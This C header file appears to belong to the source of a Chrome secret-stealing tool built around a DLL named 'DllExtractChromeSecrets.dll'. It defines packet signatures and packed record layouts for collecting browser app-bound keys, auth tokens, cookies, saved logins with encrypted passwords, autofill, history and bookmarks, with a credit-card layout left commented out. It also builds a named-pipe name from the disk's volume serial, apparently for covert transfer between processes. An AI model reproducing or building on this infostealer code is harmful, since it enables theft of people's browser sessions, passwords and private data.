#pragma once
#ifndef COMMON_H
#define COMMON_H

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_DLL_NAME                    L"DllExtractChromeSecrets.dll"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define BUFFER_SIZE_16                  16
#define BUFFER_SIZE_32                  32
#define BUFFER_SIZE_64                  64
#define BUFFER_SIZE_128                 128
#define BUFFER_SIZE_256                 256
#define BUFFER_SIZE_512                 512
#define BUFFER_SIZE_1024                1024
#define BUFFER_SIZE_2048                2048
#define BUFFER_SIZE_8192                8192

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PACKET_SIG_APP_BOUND_KEY        'YKBA'
#define PACKET_SIG_TOKEN                'NKOT'
#define PACKET_SIG_COOKIE               'KOOC'
#define PACKET_SIG_LOGIN                'NGOL'
#define PACKET_SIG_CREDIT_CARD          'DRCC'
#define PACKET_SIG_AUTOFILL             'LLFA'
#define PACKET_SIG_HISTORY              'TSIH'
#define PACKET_SIG_BOOKMARK             'KMKB'

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PIPE_NAME_FRMT                  "\\\\.\\pipe\\%08X%08X"


static inline VOID GetPipeName(OUT LPSTR pszPipeName, IN DWORD dwSize)
{
    DWORD   dwState1    = 0x5EED1234,
            dwState2    = 0x00,
            dwSerial    = 0x00;

    GetVolumeInformationA("C:\\", NULL, 0, &dwSerial, NULL, NULL, NULL, 0);
    
    dwState1 ^= dwSerial;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState1 ^= dwState1 << 13;
        dwState1 ^= dwState1 >> 17;
        dwState1 ^= dwState1 << 5;
    }

    dwState2 = dwState1;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState2 ^= dwState2 << 13;
        dwState2 ^= dwState2 >> 17;
        dwState2 ^= dwState2 << 5;
    }

    StringCchPrintfA(pszPipeName, dwSize, PIPE_NAME_FRMT, dwState1, dwState2);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


#define HEAP_FREE(ptr)                                      \
    do {                                                    \
        if (ptr) {                                          \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


#define HEAP_FREE_SECURE(ptr, size)                         \
    do {                                                    \
        if (ptr) {                                          \
            SecureZeroMemory((PVOID)ptr, size);             \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==



#pragma pack(push, 1)
typedef struct _DATA_PACKET
{
    DWORD       dwSignature;
    DWORD       dwDataSize;
    BYTE        bData[];
} DATA_PACKET, *PDATA_PACKET;

#define PACKET_SIZE(DATASIZE) (sizeof(DATA_PACKET) + (DATASIZE))

typedef struct _TOKEN_RECORD_PACKET
{
    DWORD   dwServiceLen;
    DWORD   dwTokenLen;
    DWORD   dwBindKeyLen;
    BYTE    bData[]; // [service][token][bindkey]
} TOKEN_RECORD_PACKET, *PTOKEN_RECORD_PACKET;

typedef struct _COOKIE_RECORD_PACKET
{
    DWORD   dwHostKeyLen;
    DWORD   dwPathLen;
    DWORD   dwNameLen;
    INT64   llExpiresUtc;
    DWORD   dwEncryptedValueLen;
    BYTE    bData[];  // [host_key][path][name][encrypted_value]
} COOKIE_RECORD_PACKET, *PCOOKIE_RECORD_PACKET;

typedef struct _LOGIN_RECORD_PACKET
{
    DWORD   dwOriginUrlLen;
    DWORD   dwActionUrlLen;
    DWORD   dwUsernameLen;
    DWORD   dwPasswordLen;
    INT64   llDateCreated;
    INT64   llDateLastUsed;
    BYTE    bData[];  // [origin_url][action_url][username][encrypted_password]
} LOGIN_RECORD_PACKET, *PLOGIN_RECORD_PACKET;

/*
typedef struct _CREDIT_CARD_RECORD_PACKET
{
    DWORD   dwNameOnCardLen;
    DWORD   dwNicknameLen;
    DWORD   dwExpirationMonth;
    DWORD   dwExpirationYear;
    INT64   llDateModified;
    DWORD   dwEncryptedCardNumberLen;
    BYTE    bData[];  // [name_on_card][nickname][encrypted_card_number]
} CREDIT_CARD_RECORD_PACKET, *PCREDIT_CARD_RECORD_PACKET;
*/

typedef struct _AUTOFILL_RECORD_PACKET
{
    DWORD   dwNameLen;
    DWORD   dwValueLen;
    INT64   llDateCreated;
    DWORD   dwCount;
    BYTE    bData[];  // [name][value]
} AUTOFILL_RECORD_PACKET, *PAUTOFILL_RECORD_PACKET;

typedef struct _HISTORY_RECORD_PACKET
{
    DWORD   dwUrlLen;
    DWORD   dwTitleLen;
    DWORD   dwVisitCount;
    INT64   llLastVisitTime;
    BYTE    bData[];  // [url][title]
} HISTORY_RECORD_PACKET, *PHISTORY_RECORD_PACKET;

typedef struct _BOOKMARK_RECORD_PACKET
{
    DWORD   dwNameLen;
    DWORD   dwUrlLen;
    INT64   llDateAdded;
    BYTE    bData[];  // [name][url]
} BOOKMARK_RECORD_PACKET, *PBOOKMARK_RECORD_PACKET;

#pragma pack(pop)


#endif // !COMMON_H